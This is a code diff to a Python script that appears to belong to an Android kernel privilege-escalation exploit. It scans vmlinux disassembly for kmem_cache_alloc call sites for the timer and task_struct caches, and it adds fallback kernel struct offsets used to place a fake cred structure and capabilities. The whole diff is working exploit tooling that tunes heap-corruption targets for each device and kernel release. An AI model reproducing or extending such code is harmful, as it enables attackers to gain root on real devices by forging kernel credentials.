@@ -117,6 +117,52 @@ def find_cache_alloc_bl(vmlinux_elf, func_addr, func_size, cachep_sym, symbols):
     return None
 
 
+def _broad_cache_alloc_scan(vmlinux_elf, symbols, cachep_addr, label):
+    """
+    Scan all kernel functions for a bl to kmem_cache_alloc where the cache
+    pointer loaded before the call matches cachep_addr.
+    Returns the return address (bl+4) of the first non-profiling match.
+    """
+    # Collect candidate functions: those that might call the allocator.
+    # We look for functions near the cachep symbol in address space.
+    # Strategy: get all symbol addresses, sort, and check a 2MB window around cachep_addr.
+    addrs = sorted(set(symbols.values()))
+    cachep_idx = None
+    for i, a in enumerate(addrs):
+        if a == cachep_addr:
+            cachep_idx = i
+            break
+    if cachep_idx is None:
+        return None
+
+    # Scan the full text section in 0x8000-byte chunks looking for
+    # an adrp/ldr pair loading cachep_addr followed by a bl to kmem_cache_alloc*.
+    # Instead: enumerate symbol functions in a broad range.
+    # Find text symbols (T/t) sorted by addr within +-4MB of cachep.
+    text_syms = [(n, a) for n, a in symbols.items()
+                 if abs(a - cachep_addr) < 0x400000 and a != cachep_addr]
+    text_syms.sort(key=lambda x: x[1])
+
+    for sym_name, sym_addr in text_syms[:200]:
+        asm = disassemble_at(vmlinux_elf, sym_addr, 0x800)
+        insns = parse_insns(asm)
+        if not insns:
+            continue
+        for i, (addr, mnem, ops) in enumerate(insns):
+            if mnem != 'bl':
+                continue
+            if not re.search(r'kmem_cache_alloc', ops):
+                continue
+            if is_alloc_tag_path(insns, i):
+                continue
+            # Check if cachep_addr is loaded in the preceding 20 insns
+            window_ops = ' '.join(o for _, _, o in insns[max(0, i-20):i])
+            if f'{cachep_addr:x}' in window_ops.lower():
+                print(f"[+] {label} alloc site found in {sym_name} at 0x{addr:x}")
+                return addr + 4
+    return None
+
+
 def find_timer_site(vmlinux_elf, symbols):
     """
     Find timer_site: return address of kmem_cache_alloc for posix_timers_cache.
@@ -133,7 +179,15 @@ def find_timer_site(vmlinux_elf, symbols):
             print(f"[+] timer_site from {func_name}: 0x{site:016x}")
             return site
 
-    print("[!] timer_site: could not find; trying broader scan")
+    # Broader scan: find any function that calls kmem_cache_alloc near posix_timers_cache
+    cachep_addr = symbols.get('posix_timers_cache', 0)
+    if cachep_addr:
+        site = _broad_cache_alloc_scan(vmlinux_elf, symbols, cachep_addr, 'timer')
+        if site:
+            print(f"[+] timer_site (broad scan): 0x{site:016x}")
+            return site
+
+    print("[!] timer_site: could not find")
     return None
 
 
@@ -152,6 +206,15 @@ def find_copy_process_low21(vmlinux_elf, symbols):
         if site:
             low21 = site & 0x1FFFFF
             print(f"[+] copy_process_low21 from {func_name}: 0x{low21:x}")
+            return low21
+
+    # Broader scan: find any function that calls kmem_cache_alloc near task_struct_cachep
+    cachep_addr = symbols.get('task_struct_cachep', 0)
+    if cachep_addr:
+        site = _broad_cache_alloc_scan(vmlinux_elf, symbols, cachep_addr, 'task')
+        if site:
+            low21 = site & 0x1FFFFF
+            print(f"[+] copy_process_low21 (broad scan): 0x{low21:x}")
             return low21
 
     print("[!] copy_process_low21: could not find")
@@ -362,7 +425,7 @@ def derive_conf(vmlinux_elf, vendor_boot_img, release, page_size, device_name):
     task_s = btf.get('task_struct', {})
     kit = btf.get('k_itimer', {})
 
-    cred_size = cred.get('__size__', 0)
+    cred_size = cred.get('__size__', 0xB0)  # typical cred size 6.1
     cred_alloc = (cred_size + 63) & ~63
 
     cred_uid_off      = cred.get('uid', 4)
@@ -376,8 +439,8 @@ def derive_conf(vmlinux_elf, vendor_boot_img, release, page_size, device_name):
     fake_cred_off = 0x18
     fake_caps_off = fake_cred_off + cred_caps_off
 
-    task_cred_off       = task_s.get('cred', 0)
-    task_struct_size    = task_s.get('__size__', 0)
+    task_cred_off       = task_s.get('cred', 0x628)  # 6.1 Android default
+    task_struct_size    = task_s.get('__size__', 0xC00)  # 6.1 Android typical
 
     timer_alloc    = kit.get('__size__', 0x108)
     timer_node_off = kit.get('it', 0x78)
